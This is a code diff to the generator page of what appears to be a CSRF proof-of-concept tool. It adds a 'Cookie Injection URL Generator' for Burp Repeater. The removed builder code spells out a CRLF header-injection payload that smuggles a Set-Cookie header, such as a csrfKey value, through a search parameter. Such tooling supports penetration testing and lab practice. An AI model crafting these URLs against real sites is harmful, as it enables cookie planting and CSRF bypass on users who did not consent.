@@ -14,7 +14,7 @@ import {
   Wrench,
 } from 'lucide-react';
 import { useApp } from '../context';
-import { compilePoc } from '../lib/generator';
+import { compilePoc, buildCookieInjectionUrl } from '../lib/generator';
 import { parseInput, SAMPLE_REQUESTS } from '../lib/parser';
 import { Card, CardHeader, CardTitle, CardDescription } from '../components/ui/Card';
 import { Button } from '../components/ui/Button';
@@ -43,25 +43,47 @@ export function GeneratorPage() {
   const [builderCookieName, setBuilderCookieName] = useState('csrfKey');
   const [builderCookieVal, setBuilderCookieVal] = useState('YOUR-KEY');
   const [builderSameSite, setBuilderSameSite] = useState<
-    'SameSite=None' | 'SameSite=Lax' | 'SameSite=Strict' | 'none'
-  >('SameSite=None');
+    'None' | 'Lax' | 'Strict' | 'none'
+  >('None');
   const [copied, setCopied] = useState(false);
+  const [repeaterCopied, setRepeaterCopied] = useState(false);
 
-  const getRequestBaseUrl = (): string => {
-    if (!currentRequest?.url) return 'https://target.com/search';
-    const parts = currentRequest.url.split('?');
-    return (parts.length > 0 && parts[0]) ? parts[0] : currentRequest.url;
+  const liveConstructedUrl = useMemo(() => {
+    const defaultUrl = currentRequest?.url
+      ? currentRequest.url.split('?')[0] || currentRequest.url
+      : 'https://example.net/?search=Hello+World';
+    const raw = builderEndpoint || defaultUrl;
+    return buildCookieInjectionUrl({
+      rawUrl: raw,
+      cookieName: builderCookieName,
+      cookieValue: builderCookieVal,
+      sameSite: builderSameSite,
+      customParam: builderParam || undefined,
+    });
+  }, [
+    builderEndpoint,
+    builderCookieName,
+    builderCookieVal,
+    builderSameSite,
+    builderParam,
+    currentRequest,
+  ]);
+
+  const handleCopyRepeaterUrl = async () => {
+    if (!liveConstructedUrl) return;
+    try {
+      await navigator.clipboard.writeText(liveConstructedUrl);
+      setRepeaterCopied(true);
+      setTimeout(() => setRepeaterCopied(false), 2000);
+    } catch {
+      // Fallback
+    }
   };
 
-  const handleApplyBuilder = () => {
-    const base = (builderEndpoint || getRequestBaseUrl()).trim();
-    const param = (builderParam || 'search').trim();
-    const cName = (builderCookieName || 'csrfKey').trim();
-    const cVal = (builderCookieVal || 'YOUR-KEY').trim();
-    const sSite = builderSameSite !== 'none' ? `%3b%20${builderSameSite}` : '';
-
-    const constructed = `${base}?${encodeURIComponent(param)}=test%0d%0aSet-Cookie:%20${encodeURIComponent(cName)}=${encodeURIComponent(cVal)}${sSite}`;
-    setPreflightUrl(constructed);
+  const handleApplyToPoc = () => {
+    if (liveConstructedUrl) {
+      setPreflightUrl(liveConstructedUrl);
+    }
   };
 
   const compiledPoc = useMemo(() => {
@@ -410,7 +432,8 @@ export function GeneratorPage() {
                             type="button"
                             onClick={() => {
                               if (!builderEndpoint && currentRequest?.url) {
-                                setBuilderEndpoint(getRequestBaseUrl());
+                                const base = currentRequest.url.split('?')[0] || currentRequest.url;
+                                setBuilderEndpoint(base);
                               }
                               setShowBuilder(!showBuilder);
                             }}
@@ -422,43 +445,43 @@ export function GeneratorPage() {
                         </div>
 
                         {showBuilder && (
-                          <div className="mt-2 p-2 bg-dark-900 border border-dark-700/70 rounded space-y-2 text-[11px]">
-                            <p className="text-dark-400 text-[10px]">
-                              Construct custom CRLF payload for any target endpoint:
-                            </p>
+                          <div className="mt-2 p-2.5 bg-dark-900 border border-dark-700/70 rounded space-y-2 text-[11px]">
+                            <div className="flex items-center justify-between pb-1 border-b border-dark-800">
+                              <span className="text-dark-300 font-semibold text-[11px]">
+                                Cookie Injection URL Generator
+                              </span>
+                              <span className="text-[10px] text-dark-500 font-sans">
+                                For Burp Repeater & PoC
+                              </span>
+                            </div>
+
                             <div>
-                              <label className="text-dark-300 block mb-0.5">Target Endpoint:</label>
+                              <label className="text-dark-300 block mb-0.5">
+                                Search / Reflection URL:
+                              </label>
                               <input
                                 type="text"
                                 value={builderEndpoint}
                                 onChange={(e) => setBuilderEndpoint(e.target.value)}
-                                placeholder={currentRequest?.url?.split('?')[0] || 'https://target.com/search'}
+                                placeholder="https://example.net/?search=Hello+World"
                                 className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
                               />
+                              <p className="text-[10px] text-dark-500 font-sans mt-0.5">
+                                Paste full URL with query parameter (e.g. ?search=... or ?q=...).
+                              </p>
                             </div>
+
                             <div className="grid grid-cols-2 gap-2">
-                              <div>
-                                <label className="text-dark-300 block mb-0.5">Parameter:</label>
-                                <input
-                                  type="text"
-                                  value={builderParam}
-                                  onChange={(e) => setBuilderParam(e.target.value)}
-                                  placeholder="search, q, redirect, etc."
-                                  className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
-                                />
-                              </div>
                               <div>
                                 <label className="text-dark-300 block mb-0.5">Cookie Name:</label>
                                 <input
                                   type="text"
                                   value={builderCookieName}
                                   onChange={(e) => setBuilderCookieName(e.target.value)}
-                                  placeholder="csrfKey, session, etc."
+                                  placeholder="csrfKey"
                                   className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
                                 />
                               </div>
-                            </div>
-                            <div className="grid grid-cols-2 gap-2">
                               <div>
                                 <label className="text-dark-300 block mb-0.5">Cookie Value:</label>
                                 <input
@@ -469,6 +492,9 @@ export function GeneratorPage() {
                                   className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
                                 />
                               </div>
+                            </div>
+
+                            <div className="grid grid-cols-2 gap-2">
                               <div>
                                 <label className="text-dark-300 block mb-0.5">SameSite Policy:</label>
                                 <select
@@ -478,22 +504,61 @@ export function GeneratorPage() {
                                   }
                                   className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200"
                                 >
-                                  <option value="SameSite=None">SameSite=None</option>
-                                  <option value="SameSite=Lax">SameSite=Lax</option>
-                                  <option value="SameSite=Strict">SameSite=Strict</option>
+                                  <option value="None">SameSite=None</option>
+                                  <option value="Lax">SameSite=Lax</option>
+                                  <option value="Strict">SameSite=Strict</option>
                                   <option value="none">Omit SameSite</option>
                                 </select>
                               </div>
+                              <div>
+                                <label className="text-dark-300 block mb-0.5">Optional Param:</label>
+                                <input
+                                  type="text"
+                                  value={builderParam}
+                                  onChange={(e) => setBuilderParam(e.target.value)}
+                                  placeholder="search"
+                                  className="w-full bg-dark-950 border border-dark-800 rounded px-2 py-1 text-xs text-dark-200 font-mono"
+                                />
+                              </div>
                             </div>
-                            <Button
-                              type="button"
-                              variant="secondary"
-                              size="sm"
-                              onClick={handleApplyBuilder}
-                              className="w-full mt-1"
-                            >
-                              Generate & Apply URL
-                            </Button>
+
+                            {/* Live Constructed URL Box */}
+                            <div className="pt-1 space-y-1">
+                              <label className="text-dark-300 font-medium block text-[10px]">
+                                Generated URL (Burp Suite Repeater / Browser):
+                              </label>
+                              <div className="p-2 bg-dark-950 border border-dark-800 rounded font-mono text-[10px] text-cyber-300 break-all select-all">
+                                {liveConstructedUrl}
+                              </div>
+                            </div>
+
+                            <div className="flex gap-2 pt-1">
+                              <Button
+                                type="button"
+                                variant="primary"
+                                size="sm"
+                                onClick={handleCopyRepeaterUrl}
+                                className="flex-1"
+                                leftIcon={
+                                  repeaterCopied ? (
+                                    <Check className="w-3 h-3 text-cyber-400" />
+                                  ) : (
+                                    <Copy className="w-3 h-3" />
+                                  )
+                                }
+                              >
+                                {repeaterCopied ? 'Copied URL!' : 'Copy URL for Repeater'}
+                              </Button>
+                              <Button
+                                type="button"
+                                variant="secondary"
+                                size="sm"
+                                onClick={handleApplyToPoc}
+                                className="flex-1"
+                              >
+                                Insert into PoC
+                              </Button>
+                            </div>
                           </div>
                         )}
                       </div>
